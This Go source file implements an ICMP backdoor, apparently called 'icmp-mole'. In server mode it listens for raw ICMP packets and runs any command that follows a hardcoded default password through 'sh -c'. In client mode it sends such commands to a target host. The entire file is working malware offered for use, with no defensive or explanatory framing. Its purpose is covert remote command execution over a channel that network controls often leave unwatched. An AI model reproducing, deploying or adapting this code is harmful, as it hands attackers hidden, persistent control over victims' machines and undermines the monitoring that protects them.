package main

import (
	"flag"
	"log"
	"net"
	"os/exec"
	"strings"
)

func run(cmd string) {
	log.Println(cmd)
	c := exec.Command("sh", "-c", cmd)
	if err := c.Start(); err != nil {
		log.Println(err)
	}
	if err := c.Wait(); err != nil {
		log.Println(err)
	}
}

func server(addr, password string) error {
	conn, err := net.ListenPacket("ip:icmp", addr)
	if err != nil {
		return err
	}
	buf := make([]byte, 1024)
	for {
		_, _, err := conn.ReadFrom(buf)
		if err != nil {
			return err
		}
		bufstr := string(buf)
		strs := strings.Split(bufstr, "\x00\x00")
		if len(strs) >= 3 && strs[0] == password {
			switch strs[1] {
			default:
				go run(strs[1])
			}
		}
	}
	return nil
}

func client(addr, password, cmd string) error {
	conn, err := net.Dial("ip:icmp", addr)
	if err != nil {
		return err
	}
	_, err = conn.Write([]byte(password + "\x00\x00" + cmd + "\x00\x00"))
	if err != nil {
		return err
	}
	return nil
}

var (
	addr     string
	cmd      string
	password string
	t        string
)

func init() {
	flag.StringVar(&addr, "addr", "127.0.0.1", "Address")
	flag.StringVar(&password, "password", "icmp-mole", "Password")
	flag.StringVar(&t, "type", "server", "client | server")
	flag.Parse()
}

func main() {
	if t == "client" {
		if err := client(addr, password, strings.Join(flag.Args(), " ")); err != nil {
			log.Println(err)
		}
	} else {
		if err := server(addr, password); err != nil {
			log.Println(err)
		}
	}
}
